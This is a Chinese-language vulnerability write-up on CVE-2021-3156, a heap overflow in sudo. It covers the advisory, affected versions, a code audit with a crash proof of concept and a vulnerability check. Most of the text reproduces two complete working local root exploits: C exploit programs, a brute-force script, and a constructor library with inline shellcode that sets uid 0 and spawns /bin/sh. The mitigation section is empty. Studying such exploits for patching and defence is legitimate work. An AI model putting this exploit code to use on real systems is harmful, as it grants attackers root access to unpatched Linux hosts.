
# 0X00 漏洞信息
2021年1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。攻击者无需知道用户密码，一样可以获得root权限，并且是在默认配置下。<br />当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。<br />研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。


# 0X01 漏洞概述
| 漏洞名称 | Linux sudo权限提升漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2021-3156 |
| CNVD编号 |  |
| CNNVD编号 |  |
| 其他编号 |  |
| 披露时间 | 2021.01.15 |
| 分数 | 7.8 |
| CVSS | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2021-3156](https://nvd.nist.gov/vuln/detail/CVE-2021-3156) |


# 0X02 影响范围
**受影响版本**

- Sudo 1.8.2 – 1.8.31p2
- Sudo 1.9.0 – 1.9.5p1

**不受影响版本**<br />sudo =>1.9.5p2


# 0X03 环境搭建
**环境**：ubuntu20.04.1，sudo-1.8.31 


# 0X04 代码审计
这里以 sudo 1.8.31 版本作为分析目标。 ubuntu 20.04.1 作为分析环境<br />poc
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(){

		int obufsz = 8;
		char obuf[obufsz];
		memset(obuf, 'B', sizeof(obuf));
		obuf[obufsz-2] = 0x5c;
		obuf[obufsz-1] = 0x00;
		char *args[] = {
			"/usr/bin/sudoedit",
			"-s",
			obuf,
			NULL
		};

		char *extra_args[] = {
			"X/X\\",
			"a",
			"LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
			NULL,
		};

		execve(args[0], args, extra_args);

		// execvpe("./sudoedit", args, extra_args);

}
```

漏洞产生的代码在`plugins/sudoers/sudoers.c` 的`set_cmnd`函数
![image.png](./assets/1659510805764-a5b72a1b-65cf-4f56-85d5-0c0ba428f3ff.png)

首先通过 854 处，为` sudoedit -s `后的字符长度分配内存空间， 即 `user_args`, 当代码处理到 866 处的时候， 如果参数为如下结构，即
```c
pwndbg> p NewArgv[0] 
$4 = 0x55555557183e "sudoedit" 
pwndbg> p NewArgv[1] 
$5 = 0x7ffffffee13 "BBBBBB\\" 
pwndbg> p NewArgv[2] 
$6 = 0x0 
pwndbg>
```

第一次拷贝 会将 B 拷贝到` user_args `里，然后` from ++`<br />当 B 拷贝完，` from[0] == '\\'` ， 且`from[1] `不为空的时候， 此时` from ++` , 然后又进到这个 `while` 循环，` from` 后面的数据
```c
pwndbg> p from[0] 
$3 = 92 '\\' 
pwndbg> p from[1] 
$4 = 0 '\000'
```

这个时候` from `后面的数据为环境变量设置的数据, 即这里此时` from[0] 为 X/X` 。最终结果就是 `user_args `被越权。

参考链接：<br />[https://bestwing.me/CVE-2021-3156-analysis.html](https://bestwing.me/CVE-2021-3156-analysis.html)
[https://blog.csdn.net/weixin_46483787/article/details/125552056](https://blog.csdn.net/weixin_46483787/article/details/125552056)

# 0X05 漏洞复现
漏洞验证
```
sudoedit -s /
```
![image-20211104225041044.png](./assets/1659510075511-ae3bb23b-b0bc-42ea-8bea-f7b6adb021de.png)
报错开头以sudoedit则存在漏洞，报错以usage开头，则不受影响。



# 0X05 EXP

## EXP-1
下载地址：[https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

下载并执行<br />![image-20211105102630552.png](./assets/1659510124350-3d3987c4-a118-4d53-8161-f87bf8cc9520.png)

Makefile
```c
all:
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
brute: all
gcc -DBRUTE -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
clean:
	rm -rf libnss_X sudo-hax-me-a-sandwich
```

brute.sh
```c
#!/bin/bash

try_brute() {
    IDX=`echo "$1" | awk -F ':' '{ print $1 }'`
        ALEN=`echo "$1" | awk -F ':' '{ print $2 }'`
        BLEN=`echo "$1" | awk -F ':' '{ print $3 }'`
        NLEN=`echo "$1" | awk -F ':' '{ print $4 }'`
        LCLEN=`echo "$1" | awk -F ':' '{ print $5 }'`
        OFN=out/`printf "%08d" $IDX`.txt
        
        (
        timeout 2 stdbuf -oL ./sudo-hax-me-a-sandwich $ALEN $BLEN $NLEN $LCLEN 2>&1
    ) > $OFN
        
        R="`grep -B999 bl1ng $OFN`"
        
        if [ "$R" == "" ]; then
            echo "NOPE"
            else
                echo "==================" >> success.txt
                grep -B999 bl1ng $OFN >> success.txt
                fi
                
                rm -f "${OFN}"
            }

if [ "$#" == "1" ]; then
N=`echo "$1" | awk -F ':' '{ print NF }'`
if [ "$N" == 5 ]; then
try_brute "$1"
    exit 0
    fi
    fi
    
    if [ "$#" != "6" ]; then
    echo "usage: $0 <smash_min> <smash_max> <null_min> <null_max> <lc_min> <lc_max>"
        exit 0
        fi
        
        if ! [ -x "$(command -v parallel)" ]; then
        echo "error: gnu parallel not found"
            exit 1
            fi
            
            smash_min=$1
            smash_max=$2
            null_min=$3
            null_max=$4
            lc_min=$5
            lc_max=$6
            
            echo "[+] cleaning up.."
            rm -rf possib
            rm -rf success.txt
            touch success.txt
            mkdir out 2>/dev/null
            # people are likely to forget this
            make brute 2>/dev/null
            
            # generate permutations
            echo "[+] generating possibilities.."
            i=0
            for smash_len in `seq $smash_min $smash_max`; do
                for null_stomp_len in `seq $null_min $null_max`; do
                    for lc_all_len in `seq $lc_min 10 $lc_max`; do
                        if [ "$[$smash_len % 2]" == "1" ]; then
                        alen=$[($smash_len-1)/2]
                        blen=$[$alen + 1]
                        else
                        alen=$[$smash_len/2]
                        blen=$alen
                        fi
                        
                        echo "$i:${alen}:${blen}:${null_stomp_len}:${lc_all_len}" >> possib
                        i=$[$i+1]
                        done
                        done
                        done
                        
                        # start bruting
                        echo "[+] lets go.."
                            parallel -j +`nproc` --eta $0 < possib
                            
                            echo "[+] done"
                            if [ "`cat success.txt|wc -l`" == "0" ]; then
                            echo "[-] we didnt find any working candidates :("
                                else
                                    echo "[+] we found some goodies (saved in success.txt):"
                                    cat success.txt
fi
```

hax.c
```c
/**
** CVE-2021-3156 PoC by blasty <peter@haxx.in>
** ===========================================
**
** Exploit for that sudo heap overflow thing everyone is talking about.
** This one aims for singleshot. Does not fuck with your system files.
** No warranties.
**
** Shout outs to:
**   Qualys      - for pumping out the awesome bugs
**   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
**   dsc         - for letting me rack up his electricity bill
**   my wife     - for all the quality time we had to skip
**
**  Enjoy!
**
**   -- blasty // 20210130
**/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

// 512 environment variables should be enough for everyone
#define MAX_ENVP 512
#define SUDOEDIT_PATH "/usr/bin/sudoedit"

typedef struct {
    char *target_name;
    char *sudoedit_path;
    uint32_t smash_len_a;
    uint32_t smash_len_b;
    uint32_t null_stomp_len;
    uint32_t lc_all_len; 
} target_t;

target_t targets[] = {
    {
        // Yes, same values as 20.04.1, but also confirmed.
        .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
        },
    {
        .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
        },
    {
        .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = SUDOEDIT_PATH,
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60, 
        .lc_all_len     = 214
        }
};

void usage(char *prog) {
    fprintf(stdout,
            "  usage: %s <target>\n\n"
            "  available targets:\n"
            "  ------------------------------------------------------------\n",
            prog
           );
    for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
        printf("    %d) %s\n", i, targets[i].target_name);
    }
    fprintf(stdout,
            "  ------------------------------------------------------------\n"
            "\n"
            "  manual mode:\n"
            "    %s <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>\n"
            "\n",
            prog
           );
}

int main(int argc, char *argv[]) {
    printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n");
    
    if (argc != 2 && argc != 5) {
        usage(argv[0]);
        return -1;
    }
    
    target_t *target = NULL;
    if (argc == 2) {
        int target_idx = atoi(argv[1]);
        
        if (target_idx < 0 || target_idx >= (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, "invalid target index\n");
            return -1;
        }
        
        target = &targets[ target_idx ];
    }  else {
        target = malloc(sizeof(target_t));
        target->target_name    = "Manual";
        target->sudoedit_path  = SUDOEDIT_PATH;
        target->smash_len_a    = atoi(argv[1]);
        target->smash_len_b    = atoi(argv[2]);
        target->null_stomp_len = atoi(argv[3]);
        target->lc_all_len     = atoi(argv[4]);
    }
    
    printf(
        "using target: %s ['%s'] (%d, %d, %d, %d)\n", 
        target->target_name,
        target->sudoedit_path,
        target->smash_len_a,
        target->smash_len_b,
        target->null_stomp_len,
        target->lc_all_len
    );
    
    char *smash_a = calloc(target->smash_len_a + 2, 1);
    char *smash_b = calloc(target->smash_len_b + 2, 1);
    
    memset(smash_a, 'A', target->smash_len_a);
    memset(smash_b, 'B', target->smash_len_b);
    
    smash_a[target->smash_len_a] = '\\';
    smash_b[target->smash_len_b] = '\\';
    
    char *s_argv[]={
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
        };
    
    char *s_envp[MAX_ENVP];
    int envp_pos = 0;
    
    for(int i = 0; i < target->null_stomp_len; i++) {
        s_envp[envp_pos++] = "\\";
    }
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";
    
    char *lc_all = calloc(target->lc_all_len + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");
    memset(lc_all+15, 'C', target->lc_all_len);
    
    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;
    
    printf("** pray for your rootshell.. **\n");
    
    execve(target->sudoedit_path, s_argv, s_envp);
    return 0;
}

```

lib.c
```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void __attribute__ ((constructor)) _init(void);

static void _init(void) {
    printf("[+] bl1ng bl1ng! We got it!\n");
    #ifndef BRUTE
    setuid(0); seteuid(0); setgid(0); setegid(0);
    static char *a_argv[] = { "sh", NULL };
    static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
    execv("/bin/sh", a_argv);
    #endif
}
```


## EXP-2
下载地址：[https://github.com/Rvn0xsy/CVE-2021-3156-plus](https://github.com/Rvn0xsy/CVE-2021-3156-plus)

![image-20211105103424904.png](./assets/1659510297372-9ad6376e-9816-46a3-be88-4a7be620b1f2.png)
Makefile
```
all: shellcode exploit

shellcode: shellcode.c
mkdir libnss_x
$(CC) -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c

exploit: exploit.c
$(CC) -O3 -w -o exploit exploit.c

clean:
	rm -rf libnss_x exploit
```

exploit.c
```c
#include <unistd.h> // execve()
#include <string.h> // strcat()
#include <stdio.h>

/* Exploit for CVE-2021-3156, drops a root shell.
 * All credit for original research: Qualys Research Team.
 * https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
 *
 * Tested on Ubuntu 20.04 against sudo 1.8.31
 * Author: Max Kamper
 */



int main(int argc, char * argv[]) {

    if(argc < 2){
	printf("Usage: %s <Command> \n",argv[0]);
	printf("[+]Refrence : @Qualys Research Team @Max Kamper \n");
	printf("[+]Modify by Rvn0xsy@ https://payloads.online\n");	
	return 0;
    }
    char * input_command = argv[1];
    int nSize = strlen(input_command)+6;
    
    char * command = malloc(nSize);
    memset(command,0x00,nSize);
    sprintf(command,"test\n\n%s\n",input_command);
    // 'buf' size determines size of overflowing chunk.
    // This will allocate an 0xf0-sized chunk before the target service_user struct.
    int i;
    char buf[0xf0] = {0};
    memset(buf, 'Y', 0xe0);
    strcat(buf, "\\");

    char* sudoedit_argv[] = {
        "sudoedit",
	    "-S",
        "-s",
        buf,
        NULL};

    // Use some LC_ vars for heap Feng-Shui.
    // This should allocate the target service_user struct in the path of the overflow.
    char messages[0xe0] = {"LC_MESSAGES=en_GB.UTF-8@"};
    memset(messages + strlen(messages), 'A', 0xb8);

    char telephone[0x50] = {"LC_TELEPHONE=C.UTF-8@"};
    memset(telephone + strlen(telephone), 'A', 0x28);

    char measurement[0x50] = {"LC_MEASUREMENT=C.UTF-8@"};
    memset(measurement + strlen(measurement), 'A', 0x28);

    // This environment variable will be copied onto the heap after the overflowing chunk.
    // Use it to bridge the gap between the overflow and the target service_user struct.
    char overflow[0x500] = {0};
    memset(overflow, 'X', 0x4cf);
    strcat(overflow, "\\");

    // Overwrite the 'files' service_user struct's name with the path of our shellcode library.
    // The backslashes write nulls which are needed to dodge a couple of crashes.
    char* envp[] = {
        overflow,
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "XXXXXXX\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "x/x\\",
        "Z",
        messages,
        telephone,
        measurement,
        NULL};

    // Invoke sudoedit with our argv & envp.

	int des_p[2];
	if(pipe(des_p) == -1){

		puts("Error .. pipe \n");
		return -1;
	}
	
	if(fork() == 0)            //first fork
        {
            close(STDOUT_FILENO);  //closing stdout
            dup(des_p[1]);         //replacing stdout with pipe write 
            close(des_p[0]);       //closing pipe read
	    write(des_p[1],command, strlen(command));
            close(des_p[1]);
	    exit(1);
        }

	if(fork()==0){
		close(STDIN_FILENO);   //closing stdin
		dup(des_p[0]);         //replacing stdin with pipe read
		close(des_p[1]);       //closing pipe write
		close(des_p[0]);
		
		execve("/usr/bin/sudoedit", sudoedit_argv, envp);
		perror("execvp of stdread failed");
		exit(1);
	}
	close(des_p[0]);
	close(des_p[1]);
	wait(0);
	wait(0);
}
```

shellcode.c
```c
static void __attribute__((constructor)) _init(void) {
  __asm __volatile__(
      "addq $64, %rsp;"
      // setuid(0);
      "movq $105, %rax;"
      "movq $0, %rdi;"
      "syscall;"


      // setgid(0);
      "movq $106, %rax;"
      "movq $0, %rdi;"
      "syscall;"


      // execve("/bin/sh");
      "movq $59, %rax;"
      "movq $0x0068732f6e69622f, %rdi;"
      "pushq %rdi;"
      "movq %rsp, %rdi;"
      "movq $0, %rdx;"
      "pushq %rdx;"
      "pushq %rdi;"
      "movq %rsp, %rsi;"
      "syscall;"


      // exit(0);
      "movq $60, %rax;"
      "movq $0, %rdi;"
      "syscall;"

);
}
```


# 0X06 解决方案
